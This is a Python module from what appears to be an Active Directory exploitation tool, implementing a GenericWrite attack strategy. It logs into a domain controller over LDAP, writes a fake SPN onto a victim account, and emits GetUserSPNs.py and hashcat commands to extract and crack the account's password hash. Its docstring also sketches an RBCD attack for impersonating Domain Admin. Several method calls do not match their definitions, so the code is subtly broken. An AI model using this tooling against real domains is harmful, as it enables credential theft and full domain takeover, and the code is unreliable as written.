# strategies/generic_write.py

from ldap3 import Server, Connection, NTLM, ALL, MODIFY_ADD
from ldap3.core.exceptions import LDAPException

from .exploit_strategy import ExploitStrategy
from entities.edge import Edge
from entities.node import Node
from entities.node_kind import NodeKind
from entities.exploit_result import ExploitResult
from exceptions.hop_failed_error import HopFailedError

class GenericWriteStrategy(ExploitStrategy):
	"""
	GenericWrite : AD ACL (Access Control Entry) 
	to write access to non-protected attributes of an OBJECT

==============================================================================
	CASE 01 — On a User (Kerberoasting Injection)
==============================================================================
		Only service accounts have SPNS
		With this, you can write fake SPN
		Then, KDC issues a TGS encrypted with their NTLM
		Attacker has GenericWrite on VICTIM_USER
		→ Set victim.servicePrincipalName = "fake/spn"
		→ Request TGS: GetUserSPNs.py or Rubeus
		→ Crack the hash offline: hashcat
		→ Cleartext password recovered
		SPN format : serviceClass/hostname

==============================================================================
	CASE 02 — On a Group (AddMember)
==============================================================================
		Usually equivalent to AddMember

==============================================================================
	CASE 3 — On a Computer --> RBCD (Resource-Based Contrained Delegation)
==============================================================================
	A Computer object has the attribute : msDS-AllowedToActOnBehalfOfOtherIdentity
	1. Create a fake computer account (MachineAccountQuota allows this by default)
	2. Write that fake computer's SID into msDS-AllowedToActOnBehalfOfOtherIdentity of the target machine
	3. Use S4U2Self + S4U2Proxy to impersonate any user (including Domain Admin) to the target machine
	4. Get a Service Ticket as Administrator → PSExec/WinRM in

==============================================================================
	TOOLS : impacket-addcomputer, impacket-rbcd, geST.py
==============================================================================
	impacket
		impacket.ldap — LDAP operations (write the attribute)
		impacket.ldap.ldaptypes — RBCD
		impacket.examples.utils — parsing
	ldap3 — alt for attribute writes

==============================================================================
	STRATEGY CLASS
==============================================================================
	Input:  Edge(source_node, goal_node, kind=GenericWrite)
		goal_node can be: User | Computer | Group
	Decision logic:
		if goal_node.kind == USER    → SPN injection → Kerberoast
		if goal_node.kind == COMPUTER → RBCD attack
		if goal_node.kind == GROUP    → AddMember (treat as MemberOf pivot)
	Output: exploitation steps, commands, or raised HopFailedError

	"""

	def can_exploit(self, edge: Edge) -> bool:
		return edge.kind == "GenericWrite"

	def exploit(self, edge: Edge, attacker: Node, creds: dict) -> ExploitResult:
		target = edge.goal_node
		if target.kind == NodeKind.USER:
			return self._exploit_user(edge)
		elif target.kind == NodeKind.GROUP:
			return self._exploit_group(edge, attacker, creds)
		elif target.kind == NodeKind.COMPUTER:
			return self.exploit_computer(edge, attacker, creds)
		else:
			raise HopFailedError(
				edge,
				f"GenericWrite on {target.kind.value} — no known technique"
			      )

	def _exploit_user(self, edge: Edge, attacker: Node, creds: dict) -> ExploitResult:
		# STEP 01 — What does the function need to know?
		"""
		SPN needs
			dc_ip
			WHO auth     : domain, username, password
			WHICH target : DN in LDAP
			WHAT SPN     : fake SPN
		in creds or edge.goal_node.properties
		"""
		target     = edge.goal_node
		target_dn  = target.properties.get("distinguishedname")
		target_sam = target.properties.get("samaccountname")
		domain     = target.properties.get("domain","").lower()

		# STEP 02 — VALIDATE
		if not target_dn:
			raise HopFailedError(edge, "target has no distinguishedname in properties")
		if not target_sam:
			raise HopFailedError(edge, "target has no samaccountname in properties")

		# STEP 03 — Build the fake SPN string
		fake_spn = f"fake/pwned.{domain}"

		# STEP 04 — Open LDAP Connection
		"""
		Talk to DC
			Server     : WHERE connect (IP, port)
			Connection : TCP session + authentication
			bin()      : automatically with auto_bind=True
		"""
		dc_ip    = creds["dc_ip"]
		username = creds["username"]
		password = creds["password"]
		domain   = creds["domain"] # NetBIOS name : "SEVENKINGDOMS"

		try:
			server   = Server(dc_ip, port=389, get_info=ALL)
			conn     = Connection(
				server,
				user=f"{domain}\\{username}", # DOMAIN\user for NTLM
				password=password,
				authentication=NTLM,
				auto_bind=True
			   )

			success  = conn.modify(target_dn, {"servicePrincipalName": [(MODIFY_ADD, [fake_spn])]})
			# != MODIFY_REPLACE not to overwrite existing values
			if not success: # insufficientAccessRights, constraintViolation
				raise HopFailedError(edge, f"LDAP modify rejected: {conn.result['description']}")

		except LDAPException as e:
			raise HopFailedError(edge, f"LDAP error: {e}")

		# STEP 05 — Return the result
		return ExploitResult(
			technique = "GenericWrite → SPN Injection → Kerberoasting",
			edge      = edge,
			success   = True,
			next_command = (
				f"GetUserSPNs.py {domain}/{username}:'{password}' "
				f"-dc-ip {dc_ip} "
				f"-request-user {target_sam} "
				f"-outputfile {target_sam}.hash\n"
				f"hashcat -m 13100 {target_sam}.hash "
				f"/usr/share/wordlists/rockyou.txt"
			),
			cleanup_command = (
				f"bloodyAD -u {username} -p '{password}' "
				f"-d {domain} --dc-ip {dc_ip} "
				f"set object {target_sam} servicePrincipalName -v ''"
			),
			notes = (
				f"SPN '{fake_spn}' written to {target.label}. "
				f"Run next_command to request and crack the TGS hash."
			)
		)

#	def _spn_injection(self, edge: Edge) -> dict:

	def _add_member(self, edge: Edge) -> dict:
		raise HopFailedError(edge, "_exploit_computer not yet implemented")

	def _rbcd(self, edge: Edge) -> dict:
		raise HopFailedError(edge, "_exploit_computer not yet implemented")
